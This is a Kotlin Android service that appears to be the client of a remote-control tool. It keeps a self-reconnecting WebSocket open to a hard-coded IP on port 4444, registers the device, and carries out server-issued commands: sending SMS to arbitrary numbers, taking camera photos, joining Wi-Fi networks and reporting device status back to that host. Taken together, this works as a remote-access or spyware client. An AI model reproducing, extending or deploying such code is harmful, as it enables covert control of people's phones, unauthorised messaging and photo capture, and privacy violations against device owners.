package com.proactive.sptassist

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException // Import for handling JSON parsing errors
import okhttp3.*
import okio.ByteString
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit
import java.util.UUID
import java.util.concurrent.Executors
import javax.net.ssl.HostnameVerifier
import javax.net.ssl.SSLSession

class WebSocketService : Service() {

    private val TAG = "WebSocketService"
    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS) // Disable read timeout for WebSockets
        .hostnameVerifier(object : HostnameVerifier {
            override fun verify(hostname: String?, session: SSLSession?): Boolean {
                return hostname == "34.171.50.19"
            }
        })
        .build()
    private val gson = Gson()
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val cameraExecutor = Executors.newSingleThreadExecutor()

    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "VMControlChannel"
        private const val NOTIFICATION_ID = 101
        private var DEVICE_ID: String = ""
        private const val NORMAL_CLOSURE_STATUS = 1000
    }

    override fun onCreate() {
        super.onCreate()
        if (DEVICE_ID.isEmpty()) {
            val sharedPrefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
            DEVICE_ID = sharedPrefs.getString("device_unique_id", null) ?: run {
                val newId = UUID.randomUUID().toString()
                sharedPrefs.edit().putString("device_unique_id", newId).apply()
                newId
            }
        }
        Log.d(TAG, "WebSocketService created. Device ID: $DEVICE_ID")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        connectWebSocket()
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        disconnectWebSocket()
        serviceScope.cancel()
        cameraExecutor.shutdown()
        Log.d(TAG, "WebSocketService onDestroy: Resources cleaned up.")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    fun disconnectWebSocket() {
        webSocket?.close(NORMAL_CLOSURE_STATUS, "App closing or explicitly disconnected")
        webSocket = null
        Log.d(TAG, "WebSocket disconnected.")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "VM Control Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Maintains connection to VM server for remote commands."
            }
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("VM Control Active")
            .setContentText("Connected to VM server. Monitoring commands...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun connectWebSocket() {
        if (webSocket != null && webSocket!!.send("ping")) {
            Log.d(TAG, "WebSocket already connected or connecting. Skipping new connection.")
            return
        }

        val wsUrl = "wss://34.171.50.19:4444"

        val request = Request.Builder()
            .url(wsUrl)
            .build()

        Log.d(TAG, "Attempting to connect to WebSocket: $wsUrl")

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "WebSocket opened successfully!")
                val handshakeMessage = mapOf(
                    "type" to "register",
                    "deviceId" to DEVICE_ID
                )
                sendData(gson.toJson(handshakeMessage))
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Receiving raw text from server: $text")

                serviceScope.launch {
                    handleIncomingCommand(text)
                }
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                Log.d(TAG, "Receiving binary data: ${bytes.hex()}")
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket is closing: $code / $reason")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket Closed: $code / $reason")
                this@WebSocketService.webSocket = null
                if (code != NORMAL_CLOSURE_STATUS) {
                    serviceScope.launch {
                        Log.d(TAG, "Attempting to reconnect WebSocket in 5 seconds...")
                        delay(5000)
                        connectWebSocket()
                    }
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket Failure: ${t.message}", t)
                this@WebSocketService.webSocket = null
                serviceScope.launch {
                    Log.d(TAG, "Attempting to reconnect WebSocket in 5 seconds due to failure...")
                    delay(5000)
                    connectWebSocket()
                }
            }
        })
    }

    fun sendData(data: String) {
        if (webSocket?.send(data) == true) {
            Log.d(TAG, "Sent: $data")
        } else {
            Log.e(TAG, "Failed to send data: WebSocket not connected or failed.")
            if (webSocket != null) {
                Log.d(TAG, "Attempting to reconnect due to send failure...")
                connectWebSocket()
            }
        }
    }

    private fun sendCommandResponse(commandId: String, status: String, data: Any?, message: String? = null) {
        val responseMap = mutableMapOf<String, Any?>()
        responseMap["type"] = "response"
        responseMap["commandId"] = commandId
        responseMap["status"] = status
        responseMap["deviceId"] = DEVICE_ID

        if (data != null) {
            responseMap["data"] = data
        }
        if (message != null) {
            responseMap["message"] = message
        }
        sendData(gson.toJson(responseMap))
    }

    /**
     * Handles incoming command messages from the server.
     * This function now includes more robust JSON parsing and error handling.
     */
    private suspend fun handleIncomingCommand(jsonCommand: String) {
        var commandId: String? = "unknown"
        var action: String? = null
        var responseStatus = "error"
        var responseMessage: String? = null
        var result: Any? = null

        try {
            val command = gson.fromJson(jsonCommand, Map::class.java) as? Map<String, Any>

            if (command == null) {
                responseMessage = "Received invalid JSON or empty message from server."
                Log.e(TAG, responseMessage)
                // No need to send response back, as it's a parsing error of server's message.
                return
            }

            val type = command["type"] as? String // Get the 'type' field from the incoming message
            commandId = command["commandId"] as? String ?: "unknown" // Get commandId if present

            Log.d(TAG, "Server Message - Type: '$type', Command ID: '$commandId'")

            when (type) {
                "welcome" -> {
                    Log.d(TAG, "Server Welcome: ${command["message"]}")
                    // No response needed for a welcome message
                    return
                }
                "registered" -> {
                    Log.d(TAG, "Device successfully registered with server: ${command["message"]}")
                    // No response needed for registration confirmation
                    return
                }
                "error" -> {
                    Log.e(TAG, "Server Error: ${command["message"]}. Related command ID: $commandId")
                    // Server is reporting an error, no need to send another error back from client.
                    return
                }
                // --- Normal command types from server (e.g., from CLI) ---
                "command" -> { // Assuming server CLI sends 'type: "command"'
                    action = command["action"] as? String // Get the 'action' for actual commands
                    Log.d(TAG, "Executing command: '$action' with ID: '$commandId'")

                    when (action) {
                        "get_wifi_status" -> {
                            result = WifiManagerHelper(this).getWifiNetworks()
                            responseStatus = "success"
                        }
                        "connect_wifi" -> {
                            val ssid = command["ssid"] as? String ?: ""
                            val password = command["password"] as? String ?: ""
                            result = WifiManagerHelper(this).connectToWifi(ssid, password)
                            if ((result as? Map<String, Any>)?.get("status") == "error") {
                                responseStatus = "error"
                                responseMessage = (result as? Map<String, Any>)?.get("message") as? String
                            } else {
                                responseStatus = "success"
                            }
                        }
                        "send_sms" -> {
                            val number = command["number"] as? String ?: ""
                            val messageText = command["message"] as? String ?: ""
                            result = SmsHelper(this).sendSms(number, messageText)
                            if ((result as? Map<String, Any>)?.get("status") == "error") {
                                responseStatus = "error"
                                responseMessage = (result as? Map<String, Any>)?.get("message") as? String
                            } else {
                                responseStatus = "success"
                            }
                        }
                        "take_photo" -> {
                            result = CameraHelper(this, cameraExecutor).takePhoto()
                            if ((result as? Map<String, Any>)?.get("status") == "error") {
                                responseStatus = "error"
                                responseMessage = (result as? Map<String, Any>)?.get("message") as? String
                            } else {
                                responseStatus = "success"
                            }
                        }
                        "get_battery_status" -> {
                            result = BatteryHelper(this).getBatteryStatus()
                            responseStatus = "success"
                        }
                        else -> {
                            // This block is hit if 'action' is null or not recognized for 'command' type
                            responseStatus = "error"
                            responseMessage = "Unknown command action received from server: '$action'"
                            Log.e(TAG, "Unknown command action: $action")
                        }
                    }
                    // Send response ONLY for 'command' type messages
                    sendCommandResponse(commandId, responseStatus, result, responseMessage)
                    return // Exit after handling command and sending response
                }

                // --- Fallback for any other unknown types from the server ---
                else -> {
                    responseMessage = "Unknown message type from server: '$type'. Content: $jsonCommand"
                    Log.e(TAG, responseMessage)
                    // Do NOT send a response for unrecognized types from the server,
                    // to avoid creating a new error loop. Just log and ignore.
                    return
                }
            }
        } catch (e: JsonSyntaxException) {
            responseMessage = "Failed to parse incoming JSON from server: ${e.message}. Raw: $jsonCommand"
            Log.e(TAG, "JSON Syntax Error: $jsonCommand - ${e.message}", e)
            // No response needed, this is client-side parsing issue
        } catch (e: Exception) {
            responseMessage = "Error processing message from server: ${e.message}. Raw: $jsonCommand"
            Log.e(TAG, "General Error handling server message: $jsonCommand - ${e.message}", e)
            // No response needed, this is client-side processing issue
        }
        // sendCommandResponse is now explicitly called only for 'command' type messages,
        // or if you want to explicitly respond to a generic error scenario.
        // The previous 'finally' block is replaced by explicit returns.
    }
}